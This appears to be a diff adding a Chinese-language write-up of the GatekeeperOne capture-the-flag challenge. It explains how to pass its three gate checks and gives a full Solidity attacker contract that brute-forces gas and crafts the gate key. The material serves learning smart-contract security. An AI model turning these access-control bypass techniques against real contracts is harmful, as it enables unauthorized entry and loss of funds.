@@ -1,0 +1,59 @@
+這題的目標是通過 GatekeeperOne 合約的三個檢查，以進入合約並成為參賽者。合約中定義了三個 `modifier`，分別檢查呼叫者、剩餘 gas 數量、以及一個 `_gateKey` 的特定條件。這裡的挑戰在於如何通過這三個檢查。以下是每個檢查的詳細分析和解法：
+
+### GateOne 檢查
+```solidity
+require(msg.sender != tx.origin);
+```
+這裡要求 `msg.sender` 不能等於 `tx.origin`。這意味著呼叫合約的地址不能是直接的 EOA (Externally Owned Account)，而必須通過另一個合約來進行呼叫，這樣 `msg.sender` 會是合約地址，從而通過這一檢查。解法是編寫一個攻擊合約來呼叫 GatekeeperOne 合約。
+
+### GateTwo 檢查
+```solidity
+require(gasleft() % 8191 == 0);
+```
+`gasleft()` 返回當前剩餘的 gas 數量，這一檢查要求剩餘的 gas 必須能被 8191 整除。因為每一個操作都會消耗一定數量的 gas，而我們無法精確地計算每個操作消耗的 gas，解法是使用暴力測試法。通過不斷嘗試不同的 gas 數量來呼叫合約，直到找到一個能通過這個檢查的 gas 數量。這可以用一個 `for` 迴圈來進行測試，每次增加一些 gas 值，直到成功通過檢查。
+
+### GateThree 檢查
+這是最複雜的部分，涉及到對 `_gateKey` 的多個檢查。這裡我們需要使用型態轉換來滿足這些條件：
+```solidity
+require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
+require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
+require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
+```
+
+- **第一條件**  
+  要求 `_gateKey` 的低 16 bits (最右 2 bytes) 必須等於其低 32 bits (最右 4 bytes) 的最右 2 bytes。因此，這要求 `_gateKey` 的高位部分不會影響這 2 bytes。
+
+- **第二條件**  
+  `_gateKey` 的低 32 bits 必須不等於其全部 64 bits，也就是說 `_gateKey` 的高 32 bits 必須有不同的數值。
+
+- **第三條件**  
+  `tx.origin` 的低 16 bits 必須等於 `_gateKey` 的低 16 bits。這裡我們可以通過將 `tx.origin` 轉換為 `uint160`，再轉換為 `uint16`，來獲得它的低 16 bits。
+
+綜合這些條件，解法是生成一個 `_gateKey`，該 key 的低 16 bits 來自 `tx.origin`，而高 32 bits 則需要做 bitwise AND 操作來修改，確保通過檢查。具體的生成方式如下：
+```solidity
+bytes8 key = bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF;
+```
+
+### 攻擊合約
+最終，我們需要編寫一個攻擊合約來完成整個流程，包括暴力測試 gas 數量並用正確的 `_gateKey` 通過所有檢查。攻擊合約的程式碼如下：
+```solidity
+contract GatekeeperOneAttacker {
+    address public challengeInstance;
+
+    constructor(address _challengeInstance) {
+        challengeInstance = _challengeInstance;
+    }
+
+    function attack() external {
+        bytes8 key = bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF;
+        for (uint256 i = 0; i < 8191; i++) { 
+            (bool result,) = challengeInstance.call{gas:i + 8191 * 3}(abi.encodeWithSignature("enter(bytes8)", key));
+            if (result) {
+                break;
+            }
+        }
+    }
+}
+```
+
+這個合約會不斷嘗試不同的 gas 數量，直到成功通過所有檢查，並最終讓呼叫者成為 GatekeeperOne 合約的 `entrant`。
